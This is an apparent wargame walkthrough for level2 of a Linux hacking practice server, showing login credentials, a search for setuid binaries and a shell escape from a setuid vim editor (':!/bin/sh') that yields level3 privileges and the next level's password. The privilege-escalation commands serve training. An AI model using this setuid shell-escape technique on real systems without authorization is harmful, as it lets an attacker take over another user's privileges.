### Credential
```
level2 / hacker or cracker
```

### Solution
```
[level2@ftz level2]$ ls
hint  public_html  tmp

[level2@ftz level2]$ cat hint 


텍스트 파일 편집 중 쉘의 명령을 실행시킬 수 있다는데...


[level2@ftz level2]$ find / -perm +4000 -user level3 2>/dev/null
/usr/bin/editor

[level2@ftz level2]$ ls -al /usr/bin/editor
-rwsr-x---    1 level3   level2      11651 Sep 10  2011 /usr/bin/editor


~
~                                                                                         VIM - Vi IMproved
~
~                                                                                          version 6.1.320
~                                                                                     by Bram Moolenaar et al.
~                                                                            Vim is open source and freely distributable
~
~                                                                                   Help poor children in Uganda!
~                                                                          type  :help iccf<Enter>       for information
~
~                                                                          type  :q<Enter>               to exit
~                                                                          type  :help<Enter>  or  <F1>  for on-line help
~                                                                          type  :help version6<Enter>   for version info
~
~
~
~
~
~
~
~
~
~
~
~
~
~
~
~
~
~
~
~
~
~
~
:!/bin/sh

[level3@ftz level2]$ id 
uid=3003(level3) gid=3002(level2) groups=3002(level2)

[level3@ftz level2]$ my-pass
'xterm-256color': unknown terminal type.

Level3 Password is "can you fly?".
```
